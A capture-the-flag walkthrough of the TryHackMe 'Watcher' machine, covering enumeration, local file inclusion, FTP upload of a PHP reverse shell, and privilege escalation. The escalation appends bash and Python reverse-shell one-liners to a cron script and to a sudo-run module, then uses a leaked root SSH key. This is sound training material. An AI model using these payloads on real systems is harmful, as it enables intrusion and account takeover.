# Watcher- THM
### Difficulty level : Medium
-----------------------------------------

![image](https://miro.medium.com/v2/resize:fit:282/format:webp/1*FjWiltBRXHLOOZSATSMlYQ.png)

A boot2root Linux machine utilizing web exploits along with some common 
privilege escalation techniques.

# Enumeration
First, enumerate the system with Nmap to discover open ports, 
services and versions and write the results into a file.

```bash
nmap -sC -sV -p- <IP-ADDRESS> > nmap.txt
```
-sC = default scripts.
-sV = scans versions of services.

Results:
```bash
Host is up (0.093s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 
21/tcp open ftp vsftpd 3.0.3
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA) | 256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA) |_ 256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu) 
|_http-generator: Jekyll v4.1.1 
|_http-title: Corkplacemats Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 109.48 seconds
```
There are 3 open ports: 21,22,80.

#Port 21- FTP
Check if there is anonymous login to ftp service.

```bash
ftp anonymous@<IP-ADDRESS>
```
![image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*06G29fbnjz5VBWZky74CVA.png)

failed anonymous login.

# Port 22 - SSH
To be continued...

# Port 80- HTTP

There is http service so browse the web page:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*y2GsaP5Bx80ess_qK-cdxg.png)


# Directories enumeration

```bash
gobuster dir -u <IP-ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

While gobuster is running, read the hint for Flag1:

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*holV7kP7udlkUFmnNpSDZQ.png)

This hint gives an information about robots.txt file within the system.
After navigation to this file, there are another paths.

![images](https://miro.medium.com/v2/resize:fit:562/format:webp/1*-jemTcxBi0Tb8BWUoeRXXA.png)

flag_1.txt file includes the first flag.

![images](https://miro.medium.com/v2/resize:fit:544/format:webp/1*_bjQvBvkJy8vWku9apBCTA.png)

secret_file_do_not_read.txt is forbidden.

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*RmpozeCoDb_35tgTgIAiAw.png)

According to the fact there is nothing helpful on the directories
enumeration with gobuster exclude robots.txt file, move forward to the
next hint to get Flag2.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*PkQu44uSREX734vx5v3ijQ.png)

Go back to the browser and enumerate the functionality of all the
webpages within the system. There is a webpage that includes the parameter “post”. 
Check if it’s vulnerable to lfi with :

```bash
?post=../../../etc/passwd
```

Results:
```bash
<main role="main">

<div class="row">
 <div class="col-2"></div>
 <div class="col-8">
  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
will:x:1000:1000:will:/home/will:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
 </div>
</div>

</main>
```
It is.

After few failed attempts reading ftp or Apache logs to try log poisoning,
try to read the secret file that was found above by navigate to:
/var/www/html/secret_file_do_not_read.txt

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*47hK_ONEAw5aj9rdPYAVDw.png)

There are the credentials to connect ftp server with ftpuser.
connect it with:

```bash
ftp ftpuser@<IP-ADDRESS>
```
Grab flag2.
```bash
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls 
229 Entering Extended Passive Mode (|||49567|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
226 Directory send OK.
ftp> get flag_2.txt
local: flag_2.txt remote: flag_2.txt
229 Entering Extended Passive Mode (|||42621|)
150 Opening BINARY mode data connection for flag_2.txt (21 bytes).
100% |******************************************************************|    21      788.76 KiB/s    00:00 ETA
226 Transfer complete.
21 bytes received in 00:00 (0.19 KiB/s)
```
![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*-rKYRSKPSvWcR1SnA8cObA.png)

There is directory “files” that is it possible to upload file to the system from there.
So, upload a php reverse shell to the ftp server and navigate there to
run the code and to get a shell. 
But before that, create net cat listener:

```bash
nc -lnvp 2222
```
Navigate to the path where the reverse shell was uploaded to execute it.

```bash
post=../../../home/ftpuser/ftp/files/php-reverse-shell.php
```
...and there is a shell.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZezVVq4GbeQMSF5UUcr0hg.png)

Stable the shell with this command:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
So , enumerate the system as www-data. Check the html directory to 
understand if there are any information or pages that can help.
There is a directory that includes flag3.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*AYLOLfaJ2oIQvsa3jvk0uQ.png)

After moving around the directories of all the users within the system, 
Toby was found as the owner flag4 and there is no permission to read it. 
But there is a note.txt with reading permission.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*sqyya_P1vZeQYvrRXTyWig.png)

Check the cronjobs as written maybe there is something helpful.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*qkkZe-TTNki6nqsrskTNGw.png)

So, the user mat runs cow.sh every minute. Maybe, it can help us later.
Check permissions to run files as sudo with:

```bash
sudo -l
```

Results:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*L56sONIcWmTM8p-EtEpmog.png)

Because toby can run every file on the system as sudo, change the user to
toby with sudo. Now, there is an access to the next flag.

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*sV7DkaPx8rYNvwI7igrgfQ.png)

As shown on crontab, the user mat run cow.sh every min. 
That means another injection of reverse- shell but this time with 
bash to get reverse-shell as mat.

```bash
echo 'bash -i >& /dev/tcp/<YOUR-IP>/3333 0>&1' >> cow.sh
```
Then, set a net cat listener with:

```bash
nc -lnvp 3333
```
…and there is a shell as mat.

![image](https://miro.medium.com/v2/resize:fit:640/format:webp/1*O38uWJrBLymJkatMQ0rD-g.png)

Read flag5.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*5Qq2X4qz3OgUVFZL-oLCAQ.png)

There is a note.txt file:

```bash
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```
That note gives a clue about the fact that mat can run a specific file as will.
So, check it with sudo -l.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*0ysYtg4dBoQ0Zm_X_3l8gQ.png)

Inside “scripts”, there are 2 python codes.

cmd.py:
```bash
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```
will_script.py:
```bash
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```

As mat, edit the cmd.py cause it has write permission. After the cmd.py runs, will’s script calls the system to actually run those command that the
user chose. 
So again, inject python reverse shell to cmd.py that run as user 
will and get the reverse shell as will.

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP-ADDRESS>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> cmd.py
```
Set netcat listener:

```bash
nc -lnvp 1234
```

Run will’s script:

```bash
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *
```

There is a shell as will, read flag6.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*XQkaGg4gxmHXFU8RbpeuGg.png)

Keep enumerate the system as will. navigate to /opt. 
There is backups directory. Check who has the directory and what group it relates to.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*kGmqr9TYV4XCafuMC18pbw.png)

This directory relates to “adm” group.

will is relates to “adm” group too which means that will can move there and 
read the file inside.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*PyOe9tetcRJFI2k3g_5Xmw.png)

There is a key with the end of .b64. The content is encoded to base64.
Grab the text and decode it plain text.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*6plOZGzJJ5iaPKTqk6j9sg.png)

There is SSH key. So, the last user is root. Use pass the key attack instead of
get any credentials but before that give it the right permission to get inside the SSH. 
Grab the decoded text and paste it inside a file and change the permissions with:

```bash
chmod 600 <ssh-key-filename>
```
connect to SSH with:
```bash
ssh -i <ssh-key-filename> root@<machine-ip>
```

Grab the last flag.

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*7gMkJ_yM3aDbNiFOwd-eeA.png)


And that’s it for now!

Hope you find this writeup helpful.

Happy Hacking!

Written by Alon Presman, Penetration Tester and Ethical Hacker.
































